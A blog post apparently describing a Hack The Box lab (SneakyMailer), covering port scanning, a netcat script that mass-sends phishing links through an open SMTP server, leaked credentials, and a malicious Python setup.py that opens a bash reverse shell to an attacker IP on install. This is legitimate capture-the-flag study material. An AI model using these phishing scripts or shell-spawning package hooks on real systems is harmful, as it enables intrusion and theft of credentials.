<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackTheBox: SneakyMailer write-up | GoDiego</title><meta name="generator" content="Jekyll v4.0.1" /><meta property="og:title" content="HackTheBox: SneakyMailer write-up" /><meta name="author" content="Diego Bernal Adelantado" /><meta property="og:locale" content="en_US" /><meta name="description" content="Bits of automation with Python packages! Really cool box to learn different techniques, like trying to use an SMTP server to send emails using gathered data. Recommend it 100%" /><meta property="og:description" content="Bits of automation with Python packages! Really cool box to learn different techniques, like trying to use an SMTP server to send emails using gathered data. Recommend it 100%" /><link rel="canonical" href="https://diego95root.github.io/posts/SneakyMailer/" /><meta property="og:url" content="https://diego95root.github.io/posts/SneakyMailer/" /><meta property="og:site_name" content="GoDiego" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-09-17T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox: SneakyMailer write-up" /><meta name="twitter:site" content="@secfaults" /><meta name="twitter:creator" content="@Diego Bernal Adelantado" /> <script type="application/ld+json"> {"@type":"BlogPosting","headline":"HackTheBox: SneakyMailer write-up","dateModified":"2020-09-17T00:00:00+02:00","datePublished":"2020-09-17T00:00:00+02:00","url":"https://diego95root.github.io/posts/SneakyMailer/","mainEntityOfPage":{"@type":"WebPage","@id":"https://diego95root.github.io/posts/SneakyMailer/"},"author":{"@type":"Person","name":"Diego Bernal Adelantado"},"description":"Bits of automation with Python packages! Really cool box to learn different techniques, like trying to use an SMTP server to send emails using gathered data. Recommend it 100%","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><meta name="twitter:image" content="/assets/img/favicons/favicon.ico" /><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="google-site-verification" content="H84_zouPIHmurw2-AF7oHrWvvqJ1HhxxPpp1B6Vjpx4" /><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/combine/npm/jquery@3.4.1,npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.4.1,npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" crossorigin="anonymous"></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async crossorigin="anonymous"></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/favicons/logo.png" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">GoDiego</a></div><div id="site-subtitle" class="font-italic">Student, Bug Hunter, Security Enthusiast</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/timeline/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>TIMELINE</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT ME</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/diego95root" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/secfaults" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/diego-bernal-adelantado" target="_blank"> <i class="fab fa-linkedin"></i> </a> <a href="https://www.hackthebox.eu/home/users/profile/31531" target="_blank"> <i class="fas fa-cube"></i> </a> <a href=" javascript:window.open('mailto:' + ['diegobernal0905','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox: SneakyMailer write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox: SneakyMailer write-up</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Thu, Sep 17, 2020, 12:00 AM +0200"> Sep 17, 2020 <i class="unloaded">2020-09-17T00:00:00+02:00</i> </span> by <span class="author"> Diego Bernal Adelantado </span></div></div><div class="post-content"> <img src="https://www.hackthebox.eu/storage/avatars/5f5ab2f3fb31673d80623bdd98b286c3.png"><h1 id="hack-the-box-sneakymailer-write-up">Hack The Box: SneakyMailer write-up</h1><p>SneakyMailer was a medium-rated box based on enumeration and Python. It starts off with having to send emails to users through an insecure SMTP server to get credentials and a low-privileged shell with which we discover a virtual host. From there we craft a malicious Python package that will grant us a user shell. The privilege escalation was pretty easy, as we can run pip3 as sudo and so we just basically need to craft a malicious package and install it!</p><p>Let’s start! The IP of the machine is <code class="highlighter-rouge">10.10.10.197</code>.</p><h2 id="enumeration">Enumeration</h2><p>I start by enumerating open ports to discover the services running in the machine. I fire up nmap:</p><p><em>Result of nmap scan</em></p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre># Nmap 7.80 scan initiated Sat Aug 22 13:16:23 2020 as: nmap -sV -sC -oA nmap/initial 10.10.10.197
Nmap scan report for 10.10.10.197
Host is up (0.013s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd (released 2018)
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 22 13:17:11 2020 -- 1 IP address (1 host up) scanned in 48.51 seconds
</pre></table></code></div></div><p>We get a few interesting things, as always I’ll start by looking at port 80. But first I’ll add <code class="highlighter-rouge">sneakycorp.htb</code> to my <code class="highlighter-rouge">/etc/hosts</code> file.</p><h3 id="port-80-enumeration">Port 80 enumeration</h3><p>When trying to access <code class="highlighter-rouge">sneakycorp.htb</code> on my browser we get what seems like a dashboard. There aren’t too many interesting things but we can see that there is some PyPi server and by exploring we get a list of emails from employees that work in the company.</p><p><em>Dashboard</em></p><p><img src="/assets/posts_details/SneakyMailer/images/dashboard.png" alt="Img" /></p><p><em>Emails list</em></p><p><img src="/assets/posts_details/SneakyMailer/images/emails.png" alt="Img" /></p><p>I will save them in <code class="highlighter-rouge">emails.txt</code> with CeWL:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cewl -d 3 -m 3 -e --email_file emails.txt sneakycorp.htb`
</pre></table></code></div></div><ul><li><code class="highlighter-rouge">-d</code> to specify the depth of searched pages.</li><li><code class="highlighter-rouge">-m</code> to indicate the minimum lenght of a match.</li><li><code class="highlighter-rouge">-e</code> to include email addresses.</li><li><code class="highlighter-rouge">--email_file</code> to specify the file to save email addresses to.</li></ul><p>Even though there is no use for it now we could use it to bruteforce later, so it may come in handy. There was nothing else that I could see here so I moved on to the next port.</p><h3 id="port-8080-enumeration">Port 8080 enumeration</h3><p>When browsing to <code class="highlighter-rouge">sneakycorp.htb:8080</code> we can only see a Nginx default static page. I tried to bruteforce directories but unfortunately there was nothing.</p><p><em>Default Nginx page</em></p><p><img src="/assets/posts_details/SneakyMailer/images/nginx.png" alt="Img" /></p><h3 id="port-25-enumeration">Port 25 enumeration</h3><p>Seeing I had a list of email addresses and a SMTP server I thought the obvious thing was to try to send an email to those addresses (if the server allowed it of course). I started with a simple manual test:</p><p><em>Sending email using SMTP server</em></p><p><img src="/assets/posts_details/SneakyMailer/images/email1.png" alt="Img" /></p><p>Good! Having received queued means the message will be sent so we have confirmed we can send spoofed emails! Now, the next step would be to include some kind of link to see if the users would click on it. I wanted to automatise the manual test I had done so I ended up with the following:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cat emails.txt | xargs -I{} -t sh -c "./sendmail.sh {} | nc 10.10.10.197 25"
</pre></table></code></div></div><p>Where <code class="highlighter-rouge">sendmail.sh</code> is:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>echo "HELO sneakymailer.htb"
echo "MAIL FROM: test@sneakymailer.htb"
echo "RCPT TO: $1"
echo "DATA"
echo "Subject: Testing one two three"
echo "Check out http://10.10.15.49:8001/"
echo "."
echo "quit"
</pre></table></code></div></div><p>What I’m doing here is using <code class="highlighter-rouge">xargs</code> to run <code class="highlighter-rouge">sendmail.sh</code> for each line in <code class="highlighter-rouge">emails.txt</code>, which will output all the commands I want to send to the SMTP server. Then, I just pipe all that data to netcat and voilà!</p><p><em>Getting a request from the sent email</em></p><p><img src="/assets/posts_details/SneakyMailer/images/email2.png" alt="Img" /></p><p>Cool! We get some credentials after URL decoding the body post data: <code class="highlighter-rouge">paulbyrd:^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</code> (I assumed the username to be the first name and last name).</p><h3 id="courier-imapd-enumeration">Courier Imapd enumeration</h3><p>I tried to use these credentials to connect to the mailbox after some failed attempts at loggin to FTP.</p><p><em>Using collected information to log in to the mailbox</em></p><p><img src="/assets/posts_details/SneakyMailer/images/email3.png" alt="Img" /></p><p><img src="/assets/posts_details/SneakyMailer/images/email4.png" alt="Img" /></p><p>We are in! There were only two emails, for a password reset and for modules testing:</p><p><em>Sent emails from inbox</em></p><p><img src="/assets/posts_details/SneakyMailer/images/email5.png" alt="Img" /></p><p><img src="/assets/posts_details/SneakyMailer/images/email6.png" alt="Img" /></p><p>From the first email we get the password for <code class="highlighter-rouge">developer</code>: <code class="highlighter-rouge">m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</code>; while for the other we get a possible user called <code class="highlighter-rouge">low</code> and some interesting information: user <code class="highlighter-rouge">low</code> will install and test every module he finds on the PyPi service.</p><h3 id="ftp-enumeration">FTP enumeration</h3><p>Looking at the places where I could use the credentials, FTP seemed like the only option and indeed it was.</p><p><em>FTP connection</em></p><p><img src="/assets/posts_details/SneakyMailer/images/ftp1.png" alt="Img" /></p><h2 id="low-privileged-shell">Low-privileged shell</h2><p>The files seemed to be the ones on the website so after looking at the PHP ones to see if they had anything juicy and not finding anything I decided to try to upload a file. The file didn’t appear on <code class="highlighter-rouge">sneakycorp.htb</code>… weird.</p><p>After a bit of thought I wondered if maybe there were more virtual hosts! Time for more recon with <code class="highlighter-rouge">ffuf</code>:</p><p><em>Vhosts enumeration</em></p><p><img src="/assets/posts_details/SneakyMailer/images/vhosts.png" alt="Img" /></p><p>The file did appear on <code class="highlighter-rouge">dev.sneakycorp.htb</code>!</p><p><em>FTP file upload</em></p><p><img src="/assets/posts_details/SneakyMailer/images/ftp2.png" alt="Img" /></p><p>Seeing that I uploaded a simple reverse shell and set up a listener.</p><p><em>Low-privileged shell</em></p><p><img src="/assets/posts_details/SneakyMailer/images/ftp3.png" alt="Img" /></p><p>I also checked <code class="highlighter-rouge">dev.sneakycorp.htb</code> but there was nothing interesting, just one more endpoint that contained a register feature that didn’t lead anywhere.</p><p><em>Dev version of sneakycorp</em></p><p><img src="/assets/posts_details/SneakyMailer/images/dev1.png" alt="Img" /></p><p><img src="/assets/posts_details/SneakyMailer/images/dev2.png" alt="Img" /></p><h2 id="pypi-server-exploitation">PyPi server exploitation</h2><p>After a bit of recon I saw the directory containing the different virtual hosts files and there was an extra one, <code class="highlighter-rouge">pypi.sneakycorp.htb</code>, which presumably was the one that served the PyPi server. I added it to my <code class="highlighter-rouge">/etc/hosts</code> file. Another thing that stood out was a <code class="highlighter-rouge">.htpasswd</code> file that had some hardcoded credentials.</p><p><em>Hardcoded credentials in .htpasswd</em></p><p><img src="/assets/posts_details/SneakyMailer/images/htpasswd.png" alt="Img" /></p><p>I used John to crack the hash and get a new set of credentials: <code class="highlighter-rouge">pypi:soufianeelhaoui</code>.</p><p><em>Hash cracking with John The Ripper</em></p><p><img src="/assets/posts_details/SneakyMailer/images/john.png" alt="Img" /></p><p><code class="highlighter-rouge">pypi.sneakycorp.htb</code> redirected me to <code class="highlighter-rouge">sneakycorp.dev</code> but <code class="highlighter-rouge">pypi.sneakycorp.htb:8080</code> gave me the PyPi page!</p><p><em>PyPi server landing page</em></p><p><img src="/assets/posts_details/SneakyMailer/images/pypi1.png" alt="Img" /></p><p>From here on it seemed clear what we had to do: upload a malicious package to the server so that <code class="highlighter-rouge">low</code> can ‘test’ it.</p><h3 id="python-malicious-package">Python malicious package</h3><p>I used the following <a href="https://docs.python.org/3.3/distutils/packageindex.html">reference</a> to create the package. Basically we need two files:</p><ul><li><code class="highlighter-rouge">.pypirc</code>: the configuration file. We need to include the credentials we got to be able to create a package.</li></ul><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>[distutils]
index-servers = test

[test]
repository = http://pypi.sneakycorp.htb:8080
username = pypi
password = soufianeelhaoui
</pre></table></code></div></div><ul><li><code class="highlighter-rouge">setup.py</code>: the source code. I used a try except block because I was getting two connections when uploading, one from my own machine and the other from <code class="highlighter-rouge">low</code>, so I had to quit the first one and restart the listener.</li></ul><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">setuptools</span><span class="p">,</span> <span class="n">os</span>

<span class="k">try</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"echo 'bash -i &gt;&amp;/dev/tcp/10.10.14.175/8002 0&gt;&amp;1' | /bin/bash"</span><span class="p">))</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">pass</span>

<span class="n">setuptools</span><span class="p">.</span><span class="n">setup</span><span class="p">(</span>
    <span class="n">name</span><span class="o">=</span><span class="s">"root2u"</span><span class="p">,</span>
    <span class="n">version</span><span class="o">=</span><span class="s">"9.9.9"</span><span class="p">,</span>
    <span class="n">author</span><span class="o">=</span><span class="s">"No one"</span><span class="p">,</span>
    <span class="n">author_email</span><span class="o">=</span><span class="s">"root2u@root2u.com"</span><span class="p">,</span>
    <span class="n">description</span><span class="o">=</span><span class="s">"Rooted"</span><span class="p">,</span>
    <span class="n">long_description</span><span class="o">=</span><span class="s">""</span><span class="p">,</span>
    <span class="n">long_description_content_type</span><span class="o">=</span><span class="s">"text/markdown"</span><span class="p">,</span>
    <span class="n">url</span><span class="o">=</span><span class="s">"https://github.com/pypa/sampleproject"</span><span class="p">,</span>
    <span class="n">packages</span><span class="o">=</span><span class="n">setuptools</span><span class="p">.</span><span class="n">find_packages</span><span class="p">(),</span>
    <span class="n">classifiers</span><span class="o">=</span><span class="p">[</span>
        <span class="s">"Programming Language :: Python :: 3"</span><span class="p">,</span>
        <span class="s">"License :: OSI Approved :: MIT License"</span><span class="p">,</span>
        <span class="s">"Operating System :: OS Independent"</span><span class="p">,</span>
    <span class="p">],</span>
<span class="p">)</span>
</pre></table></code></div></div><p>Now that we have the barebones of the package we want to upload it to the server. We can use the following command to both register and upload the package:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python setup.py sdist register -r test upload -r test
</pre></table></code></div></div><p>It’s important to note that first I had to run <code class="highlighter-rouge">HOME=$(pwd)</code>, as <code class="highlighter-rouge">.pypirc</code> needs to be run on the home directory. Otherwise we get an error.</p><p><em>Error if uploading without being in HOME</em></p><p><img src="/assets/posts_details/SneakyMailer/images/pypi2.png" alt="Img" /></p><p><em>Successful package upload</em></p><p><img src="/assets/posts_details/SneakyMailer/images/pypi3.png" alt="Img" /></p><p>After that we can see that the package count has increased:</p><p><em>Increased package count</em></p><p><img src="/assets/posts_details/SneakyMailer/images/pypi4.png" alt="Img" /></p><p>And we also get a shell after a few seconds (because <code class="highlighter-rouge">low</code> is ‘testing’ it):</p><p><em>User shell</em></p><p><img src="/assets/posts_details/SneakyMailer/images/pypi5.png" alt="Img" /></p><h2 id="privilege-escalation">Privilege escalation</h2><p>The way to root was actually pretty easy, as always I tried to run <code class="highlighter-rouge">sudo -l</code> and got some interesting output: we could run <code class="highlighter-rouge">/usr/bin/pip3</code> without password as root.</p><p>After following <a href="https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/">this article</a> and the proof of concept mentioned on it we easily get root.</p><p><em>Root shell</em></p><p><img src="/assets/posts_details/SneakyMailer/images/root.png" alt="Img" /></p><p>The explanation is as follows:</p><ul><li>We create a temporary directory.</li><li>We create a <code class="highlighter-rouge">setup.py</code> that will get us a root shell.</li><li>We install the module using <code class="highlighter-rouge">pip3</code> as root.</li></ul><p>Even though that was it, I really liked this box and so I kept on digging and read the scripts that were automating the stuff like clicking an email or testing the packages.</p><h2 id="beyond-root-how-the-box-works">Beyond root: how the box works</h2><p>I found the directory <code class="highlighter-rouge">/opt/scripts</code> with a bunch of scripts that carry out the box maintenance.</p><p><em>Scripts directory</em></p><p><img src="/assets/posts_details/SneakyMailer/images/scripts.png" alt="Img" /></p><h3 id="how-developer-works">How developer works</h3><p>The script in <code class="highlighter-rouge">developer</code> made sure the uploaded shells in FTP were removed consistenly so people wouldn’t get hints.</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
	<span class="k">for</span> <span class="n">root</span><span class="p">,</span> <span class="n">directories</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="p">.</span><span class="n">walk</span><span class="p">(</span><span class="s">"/var/www/dev.sneakycorp.htb"</span><span class="p">):</span>
		<span class="k">for</span> <span class="n">directory</span> <span class="ow">in</span> <span class="n">directories</span><span class="p">:</span>
			<span class="k">try</span><span class="p">:</span>
				<span class="n">shutil</span><span class="p">.</span><span class="n">rmtree</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">directory</span><span class="p">))</span>
			<span class="k">except</span> <span class="n">PermissionError</span><span class="p">:</span>
				<span class="k">pass</span>
		<span class="k">for</span> <span class="nb">file</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
			<span class="k">try</span><span class="p">:</span>
				<span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="nb">file</span><span class="p">))</span>
			<span class="k">except</span> <span class="n">PermissionError</span><span class="p">:</span>
				<span class="k">print</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="nb">file</span><span class="p">))</span>
